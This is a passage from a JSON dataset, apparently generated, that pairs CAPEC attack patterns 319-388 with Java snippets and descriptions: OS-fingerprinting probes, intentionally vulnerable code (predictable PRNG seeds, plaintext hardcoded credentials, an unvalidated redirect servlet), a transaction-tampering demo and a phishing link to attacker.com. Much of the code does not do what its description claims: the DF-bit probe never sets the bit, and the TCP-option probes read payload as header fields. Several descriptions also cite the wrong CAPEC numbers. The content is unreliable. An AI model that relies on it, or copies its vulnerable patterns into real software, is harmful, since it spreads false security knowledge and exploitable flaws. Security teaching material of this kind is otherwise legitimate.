        "description": "This Java code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a target host. It then listens for an ICMP error message and extracts the echoed IP 'ID' value from the response. This technique can reveal information about the target's operating system based on how the IP 'ID' value is echoed back. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and handling identifiers improperly (CWE-1192, CWE-1290, CWE-1302, CWE-1323)."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPFragmentationProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(2000);\n\n            byte[] buffer = new byte[1]; // Minimal payload\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 12345); // Closed port\n\n            // Set the DF (Don't Fragment) bit\n            socket.send(packet);\n\n            // Wait for a response\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Check if the DF bit is echoed back\n            boolean dfBitEchoed = (response.getData()[0] & 0x40) != 0;\n            System.out.println(\"DF bit echoed: \" + dfBitEchoed);\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            System.out.println(\"No response received or other error.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an IP fragmentation probe that tests if a remote host echoes back the 'Don't Fragment' (DF) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the target host. It then waits for an ICMP error message in response and checks if the DF bit is echoed back. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and incorrectly specifying communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPTimeStampProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\"; // Target IP address\n        int port = 80; // Target port\n        InetAddress address = InetAddress.getByName(target);\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.connect(new java.net.InetSocketAddress(address, port));\n\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        socketChannel.read(buffer);\n        buffer.flip();\n\n        byte[] data = new byte[buffer.remaining()];\n        buffer.get(data);\n\n        // Extract TCP timestamp from the TCP options field\n        int timestamp = extractTimestamp(data);\n        System.out.println(\"TCP Timestamp: \" + timestamp);\n\n        socketChannel.close();\n    }\n\n    private static int extractTimestamp(byte[] data) {\n        // Simplified extraction logic for demonstration purposes\n        for (int i = 0; i < data.length - 12; i++) {\n            if (data[i] == (byte) 0x01 && data[i + 1] == (byte) 0x01) { // NOP\n                continue;\n            }\n            if (data[i] == (byte) 0x08 && data[i + 1] == (byte) 0x0A) { // Timestamp option\n                return ByteBuffer.wrap(data, i + 2, 4).getInt();\n            }\n        }\n        return -1; // Timestamp not found\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the TCP header of a response from a target server. The code connects to a specified target IP and port, reads the response, and extracts the TCP timestamp from the TCP options field. This timestamp can be used to infer the operating system of the target based on how different OSes update the timestamp value. The code embodies the main idea of the CAPEC by showing how an attacker might probe a target to gather information about its OS. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), the possibility of cleartext transmission (CWE-319), and the use of timing information (CWE-385, CWE-208) to infer protected information."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPSequenceNumberProbe {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            System.out.println(\"Client connected\");\n\n            // Generate a predictable sequence number\n            int sequenceNumber = generatePredictableSequenceNumber();\n            System.out.println(\"Generated Sequence Number: \" + sequenceNumber);\n\n            // Simulate sending a response with the sequence number\n            clientSocket.getOutputStream().write(sequenceNumber);\n            clientSocket.close();\n        }\n    }\n\n    private static int generatePredictableSequenceNumber() {\n        // CWE-337: Predictable Seed in PRNG\n        Random random = new Random(12345); // Predictable seed\n        return random.nextInt();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Sequence Number Probe, which is used for OS fingerprinting by analyzing the sequence numbers generated by a target system. The server listens on port 8080 and generates a predictable sequence number using a pseudo-random number generator (PRNG) with a fixed seed (CWE-337). This predictable sequence number can be used by an attacker to infer the operating system of the target. The code also highlights the potential vulnerability of exposing sensitive information (sequence numbers) to unauthorized actors (CWE-200) and the risk of transmitting this information in cleartext (CWE-319)."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Random;\n\npublic class ISNProbe {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java ISNProbe <target_ip>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int port = 80; // Common open port\n        int numProbes = 5; // Number of probes to send\n\n        try {\n            InetAddress target = InetAddress.getByName(targetIp);\n            for (int i = 0; i < numProbes; i++) {\n                sendSynPacket(target, port);\n                Thread.sleep(1000); // Wait between probes\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIp);\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendSynPacket(InetAddress target, int port) throws IOException {\n        try (Socket socket = new Socket(target, port)) {\n            Random random = new Random();\n            int isn = random.nextInt();\n            System.out.println(\"Sent SYN packet with ISN: \" + isn);\n            // Note: Actual SYN packet crafting and sending would require raw socket access\n            // which is not possible with standard Java libraries.\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) probe, which is used for OS fingerprinting. The code sends a number of TCP SYN packets to an open port on a target machine and prints the ISN used in each packet. This information can be analyzed to determine the OS type and version based on how different operating systems increment sequence numbers. The code highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the ISN pattern, CWE-319 (Cleartext Transmission of Sensitive Information) by sending data in cleartext, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by revealing system-level information. Note that actual SYN packet crafting and sending would require raw socket access, which is not possible with standard Java libraries."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\n\npublic class ISNProbe {\n    private static final int PORT = 8080;\n    private static long lastISN = 0;\n    private static long lastTime = System.currentTimeMillis();\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                long currentTime = System.currentTimeMillis();\n                long currentISN = generateISN(currentTime);\n                System.out.println(\"ISN: \" + currentISN + \", Time: \" + currentTime);\n                lastISN = currentISN;\n                lastTime = currentTime;\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static long generateISN(long currentTime) {\n        // Simulate ISN generation based on time\n        return lastISN + (currentTime - lastTime);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) counter rate probe. The main idea is to simulate the generation of ISNs based on the current time and measure the rate of ISN increments. The code listens for incoming connections on a specified port and generates an ISN for each connection based on the elapsed time since the last connection. This simulates the time-based algorithm for ISN generation, which can be susceptible to timing analysis. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200) and race conditions (CWE-362, CWE-367) by showing how ISNs can be inferred and how concurrent access to shared resources (like the ISN counter) can lead to security issues."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import java.util.Random;\n\npublic class PredictableISN {\n    private static final int SEED = (int) (System.currentTimeMillis() % Integer.MAX_VALUE);\n    private Random random;\n\n    public PredictableISN() {\n        this.random = new Random(SEED);\n    }\n\n    public int generateISN() {\n        return random.nextInt();\n    }\n\n    public static void main(String[] args) {\n        PredictableISN isnGenerator = new PredictableISN();\n        System.out.println(\"Generated ISN: \" + isnGenerator.generateISN());\n    }\n}",
        "description": "This Java code snippet demonstrates a predictable Initial Sequence Number (ISN) generator, which embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe'. The code initializes a pseudo-random number generator (PRNG) with a predictable seed based on the current system time. This makes the generated sequence numbers predictable, which is a vulnerability described by CWE-337 (Predictable Seed in PRNG) and CWE-341 (Predictable from Observable State). An attacker could exploit this predictability to guess the sequence numbers, potentially leading to unauthorized access or data manipulation. The code also indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing the generated ISN to unauthorized actors."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ECNProbe {\n    public static void main(String[] args) throws IOException {\n        String targetHost = \"192.168.1.1\";\n        int targetPort = 80;\n        byte[] ecnProbePacket = new byte[20]; // Simplified ECN probe packet\n\n        // Set ECN flags in the IP header (simplified, not actual implementation)\n        ecnProbePacket[1] = 0x03; // ECN flags set\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(targetHost);\n        DatagramPacket packet = new DatagramPacket(ecnProbePacket, ecnProbePacket.length, address, targetPort);\n\n        // Send the ECN probe packet\n        socket.send(packet);\n\n        // Receive the response\n        byte[] buffer = new byte[1024];\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the response (potentially exposing sensitive information)\n        System.out.println(\"Response: \" + new String(response.getData()));\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ECN (Explicit Congestion Notification) probe to check if a remote host supports ECN messaging. The code constructs a UDP packet with ECN flags set and sends it to a target host. It then waits for a response and prints it out. This process can be used for OS fingerprinting based on how different systems respond to the ECN probe. The code embodies the main idea of the CAPEC by probing for ECN support and potentially exposing sensitive information (CWE-200) in the response. Additionally, it does not include integrity checks (CWE-353) or protection for the transmitted data (CWE-319), and it could be exploited to generate excessive network traffic (CWE-406)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPWindowSizeProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                int initialWindowSize = clientSocket.getReceiveBufferSize();\n                System.out.println(\"Initial TCP Window Size: \" + initialWindowSize);\n                // CWE-200: Exposure of Sensitive Information\n                // CWE-188: Reliance on Data/Memory Layout\n                // CWE-121: Stack-based Buffer Overflow (hypothetical, not directly shown here)\n                // CWE-806: Buffer Access Using Size of Source Buffer (hypothetical, not directly shown here)\n                // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime (hypothetical, not directly shown here)\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens for incoming connections on port 8080. When a client connects, it retrieves and prints the initial TCP window size of the connection. This embodies the main idea of the CAPEC 'TCP Initial Window Size Probe' by exposing the initial window size, which can be used for OS fingerprinting. The code also highlights CWE-200 by exposing potentially sensitive information (the initial window size) to unauthorized actors. Additionally, it hints at other CWEs like CWE-188 by relying on the data layout of the TCP stack, although the actual vulnerabilities like buffer overflows (CWE-121, CWE-806) and hardware debug logic activation (CWE-1313) are not directly shown but are contextually relevant."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic class TcpOptionsProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                byte[] tcpOptions = new byte[40]; // Maximum TCP options size\n                clientSocket.getInputStream().read(tcpOptions);\n                analyzeTcpOptions(tcpOptions);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void analyzeTcpOptions(byte[] tcpOptions) {\n        // Simulate analysis of TCP options\n        System.out.println(\"Received TCP options: \" + Arrays.toString(tcpOptions));\n        // Potentially expose sensitive information\n        if (tcpOptions[0] == 1) { // Example condition\n            System.out.println(\"Sensitive information exposed: \" + Arrays.toString(tcpOptions));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens on port 8080 and reads TCP options from incoming connections. The `analyzeTcpOptions` method simulates the analysis of these options, which can be used for OS fingerprinting. The code embodies the main idea of the CAPEC by analyzing the type and order of TCP header options. It also highlights potential vulnerabilities related to the CWEs: exposure of sensitive information (CWE-200) by printing TCP options, reliance on data layout (CWE-188) by assuming a specific structure of TCP options, and multiple binds to the same port (CWE-605) by not handling such cases."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.OutputStream;\n\npublic class VulnerableTCPServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept()) {\n                    // Simulate a connection error and send a RST packet with a text payload\n                    sendRSTPacket(clientSocket, \"Connection reset due to error\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendRSTPacket(Socket socket, String message) throws IOException {\n        OutputStream out = socket.getOutputStream();\n        // Send a RST packet with a human-readable text message\n        out.write(message.getBytes());\n        out.flush();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable TCP server that listens for incoming connections on port 8080. When a client connects, the server simulates a connection error by sending a RST (reset) packet with a human-readable text message as its payload. This behavior aligns with the CAPEC description of the 'TCP RST Flag Checksum Probe' where some operating systems report a text message in the payload of a RST packet during connection errors. The code also embodies several related CWEs: it exposes sensitive information (CWE-200) by sending cleartext messages (CWE-319) without integrity checks (CWE-353, CWE-354), making it susceptible to capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorMessageQuotingProbe {\n    public static void main(String[] args) {\n        try {\n            // Create a socket to send a request\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            byte[] buf = new byte[256];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 80);\n            socket.send(packet);\n\n            // Wait for an ICMP error message\n            byte[] icmpBuf = new byte[512];\n            DatagramPacket icmpPacket = new DatagramPacket(icmpBuf, icmpBuf.length);\n            socket.receive(icmpPacket);\n\n            // Print the received ICMP error message\n            String received = new String(icmpPacket.getData(), 0, icmpPacket.getLength());\n            System.out.println(\"Received ICMP error message: \" + received);\n\n            // Analyze the quoted data\n            if (received.contains(\"sensitive\")) {\n                System.out.println(\"Sensitive information exposed: \" + received);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP Error Message Quoting Probe. The code sends a UDP packet to a specified address and waits for an ICMP error message in response. Upon receiving the ICMP error message, it prints the message and checks if it contains any sensitive information. This embodies the CAPEC idea by illustrating how an adversary might probe a target to generate and analyze ICMP error messages, potentially exposing sensitive information as described in the related CWEs."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\";\n        byte[] buffer = new byte[1024];\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(target);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 80);\n\n        // Send a UDP packet to a closed port to generate an ICMP Port Unreachable error\n        socket.send(packet);\n\n        // Listen for the ICMP error message\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the received data (potentially sensitive information)\n        System.out.println(\"Received ICMP error message: \" + new String(response.getData(), 0, response.getLength()));\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an 'ICMP Error Message Echoing Integrity Probe' (CAPEC-Name). The code sends a UDP packet to a closed port on a target machine, which triggers an ICMP Port Unreachable error message. The program then listens for the ICMP error message and prints the received data, which may contain sensitive information. This example embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information) by potentially exposing sensitive data through the ICMP error message. Additionally, it highlights the lack of integrity checks (CWE-353) in the transmission protocol."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPTotalLengthProbe {\n    public static void main(String[] args) {\n        try {\n            // Target IP address\n            String targetIP = \"192.168.1.1\";\n            InetAddress address = InetAddress.getByName(targetIP);\n\n            // Create a UDP packet to a closed port (e.g., port 9999)\n            byte[] buffer = new byte[10];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 9999);\n\n            // Send the packet\n            DatagramSocket socket = new DatagramSocket();\n            socket.send(packet);\n\n            // Receive the ICMP Port Unreachable message\n            byte[] recvBuffer = new byte[1024];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuffer, recvBuffer.length);\n            socket.receive(recvPacket);\n\n            // Extract the IP Total Length field from the ICMP message\n            int ipTotalLength = ((recvBuffer[2] & 0xFF) << 8) | (recvBuffer[3] & 0xFF);\n            System.out.println(\"IP Total Length: \" + ipTotalLength);\n\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP IP Total Length Field Probe attack. The code sends a UDP packet to a closed port on a target machine, which triggers an ICMP 'Port Unreachable' error message. The code then captures this ICMP message and extracts the IP Total Length field from the IP header. This field can be used to infer information about the target's operating system. The code embodies CWE-204 (Observable Response Discrepancy) by revealing internal state information through the IP Total Length field. It also touches on CWE-130 (Improper Handling of Length Parameter Inconsistency) by dealing with length fields in network packets. The code does not include integrity checks (CWE-353, CWE-924) and transmits data in cleartext (CWE-319), making it vulnerable to interception and modification."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            int targetPort = 12345; // Closed port\n\n            // Set a specific ID in the UDP datagram\n            buffer[0] = 0x12; // Example ID value\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n\n            // Receive ICMP error message\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Print the received data (potentially sensitive information)\n            System.out.println(\"Received: \" + new String(response.getData()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP IP 'ID' Field Error Message Probe. The code sends a UDP datagram with a specific ID value to a closed port on a target machine. When the target machine responds with an ICMP error message, the code captures and prints the response. This process can reveal internal state information about the target system, such as its operating system behavior, which is a form of 'Observable Response Discrepancy' (CWE-204). The code also highlights the risk of 'Externally-Generated Error Message Containing Sensitive Information' (CWE-211) by printing the potentially sensitive data received in the ICMP error message."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class EventMonitor {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Event hosted on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String userId;\n            while ((userId = in.readLine()) != null) {\n                System.out.println(\"User ID: \" + userId); // Logging user IDs in cleartext\n                // Simulate spamming the user\n                sendSpam(userId);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void sendSpam(String userId) {\n        System.out.println(\"Sending spam to user: \" + userId);\n        // Simulate sending spam\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable event monitoring system where an adversary hosts an event on port 8080 and logs user IDs in cleartext as they connect. The `EventMonitor` class sets up a server socket to accept incoming connections. Each connection is handled by a `ClientHandler` thread, which reads user IDs from the input stream and logs them in cleartext. This represents CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data). The `sendSpam` method simulates spamming the collected user IDs, embodying the main idea of CAPEC-94 (Harvesting Information via API Event Monitoring)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableAPIClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            String payload = \"{\\\"username\\\":\\\"admin\\\", \\\"password\\\":\\\"password123\\\"}\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            // CWE-345: Insufficient Verification of Data Authenticity\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            if (response.toString().contains(\"success\")) {\n                System.out.println(\"Login successful\");\n            } else {\n                System.out.println(\"Login failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable API client that embodies the main idea of CAPEC-94: Application API Message Manipulation via Man-in-the-Middle. The code sends a POST request to an API endpoint with sensitive data (username and password) in plaintext (CWE-311: Missing Encryption of Sensitive Data). It then reads the response without verifying its authenticity (CWE-345: Insufficient Verification of Data Authenticity). Finally, it relies on client-side logic to enforce security decisions (CWE-602: Client-Side Enforcement of Server-Side Security). This setup allows an attacker to manipulate the data in transit, potentially gaining unauthorized access or altering the application's behavior."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransactionTampering {\n    public static void main(String[] args) throws Exception {\n        // Simulate a client sending a transaction\n        String originalMessage = \"Transaction: {\\\"amount\\\":100, \\\"currency\\\":\\\"USD\\\"}\";\n        System.out.println(\"Original Message: \" + originalMessage);\n\n        // Simulate an attacker intercepting and modifying the message\n        String tamperedMessage = tamperMessage(originalMessage);\n        System.out.println(\"Tampered Message: \" + tamperedMessage);\n\n        // Simulate sending the tampered message to the server\n        sendToServer(tamperedMessage);\n    }\n\n    private static String tamperMessage(String message) {\n        // CWE-471: Modification of Assumed-Immutable Data\n        return message.replace(\"100\", \"1000\");\n    }\n\n    private static void sendToServer(String message) throws IOException {\n        // CWE-311: Missing Encryption of Sensitive Data\n        Socket socket = new Socket(\"localhost\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(message);\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a transaction tampering attack. The main idea is to show how an attacker can intercept and modify a transaction message before it is sent to the server. The original message contains a transaction with an amount of 100 USD. The attacker modifies this message to change the amount to 1000 USD (CWE-471: Modification of Assumed-Immutable Data). The tampered message is then sent to the server without any encryption (CWE-311: Missing Encryption of Sensitive Data). This example highlights the vulnerabilities associated with insufficient data integrity checks and lack of encryption, which can be exploited for transaction tampering."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class NavigationRemapping {\n    private static Map<String, String> userLinks = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user input without proper validation\n        String userId = \"user123\";\n        String maliciousLink = \"http://attacker.com/phishing\";\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        addLink(userId, maliciousLink);\n\n        // Simulate user clicking on the link\n        String link = getLink(userId);\n        System.out.println(\"User is redirected to: \" + link);\n    }\n\n    // CWE-471: Modification of Assumed-Immutable Data (MAID)\n    public static void addLink(String userId, String link) {\n        userLinks.put(userId, link);\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    public static String getLink(String userId) {\n        return userLinks.get(userId);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of Application API Navigation Remapping. The `addLink` method allows an attacker to insert a malicious link for a user without proper validation (CWE-345 and CWE-346). The `getLink` method retrieves the link, which could be used to redirect the user to an attacker-controlled site. The code also highlights the issue of Modification of Assumed-Immutable Data (CWE-471) by allowing the modification of user links. Additionally, it shows the problem of Client-Side Enforcement of Server-Side Security (CWE-602) by relying on client-side data for security decisions. This example illustrates how an attacker can manipulate navigation to perform phishing attacks or other malicious activities."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"redirectUrl\");\n        String message = request.getParameter(\"message\");\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        if (redirectUrl != null && !redirectUrl.isEmpty()) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            response.sendRedirect(redirectUrl);\n        }\n\n        // CWE-311: Missing Encryption of Sensitive Data\n        if (message != null && !message.isEmpty()) {\n            // CWE-471: Modification of Assumed-Immutable Data (MAID)\n            request.getSession().setAttribute(\"message\", message);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary can manipulate client-side data to propagate malicious content. The servlet processes POST requests and handles two parameters: 'redirectUrl' and 'message'. The code contains several vulnerabilities:\n\n1. **CWE-345: Insufficient Verification of Data Authenticity** and **CWE-346: Origin Validation Error**: The 'redirectUrl' parameter is used directly without verifying its authenticity or origin, allowing an attacker to redirect users to malicious sites.\n\n2. **CWE-602: Client-Side Enforcement of Server-Side Security**: The server relies on the client to provide a safe 'redirectUrl', which is a security mechanism that should be enforced server-side.\n\n3. **CWE-311: Missing Encryption of Sensitive Data**: The 'message' parameter is stored in the session without encryption, exposing sensitive data.\n\n4. **CWE-471: Modification of Assumed-Immutable Data (MAID)**: The 'message' parameter is assumed to be immutable but can be modified by an attacker, leading to potential session hijacking or data tampering.\n\nThis code snippet embodies the main idea of CAPEC-111: Navigation Remapping To Propagate Malicious Content, by showing how an adversary can manipulate client-side data to change the behavior of the application and propagate malicious content."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
